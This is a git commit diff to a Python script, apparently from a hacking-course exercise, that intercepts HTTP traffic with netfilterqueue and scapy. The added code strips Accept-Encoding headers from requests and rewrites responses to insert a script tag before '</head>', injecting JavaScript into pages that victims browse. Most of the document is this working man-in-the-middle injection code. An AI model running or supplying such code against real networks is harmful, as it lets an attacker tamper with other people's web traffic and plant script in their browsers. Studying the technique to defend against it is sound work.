d74968ea8594458c67628e5f7614ed9b3df78912
ariyonaty <ari.h.yonaty@gmail.com>
2021-06-03 20:50:57 +0000

    Kinda working code injector.

--- Code_Injector/code_injector.py
+++ Code_Injector/code_injector.py
@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 
+import re
 import netfilterqueue
 from scapy.packet import Raw
 from scapy.layers.inet import IP, TCP
 
 redirect = b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n" 
+payload = b"<script>alert('h4ck3d');</script></head>"
 
 def set_load(packet, load):
     print(packet.show())
@@ -22,9 +24,15 @@ def process_packet(packet):
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
         if scapy_packet[TCP].dport == 80:
             print("[+] HTTP Request")
+            mod_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[Raw].load)
+            mod_packet = set_load(scapy_packet, mod_load)
+            packet.set_payload(bytes(mod_packet))
             print(scapy_packet.show())
         elif scapy_packet[TCP].sport == 80:
             print("[+] HTTP Response")
+            mod_load = scapy_packet[Raw].load.replace(b"</head>", payload)
+            mod_packet = set_load(scapy_packet, mod_load)
+            packet.set_payload(bytes(mod_packet))
             print(scapy_packet.show())
     
     packet.accept()
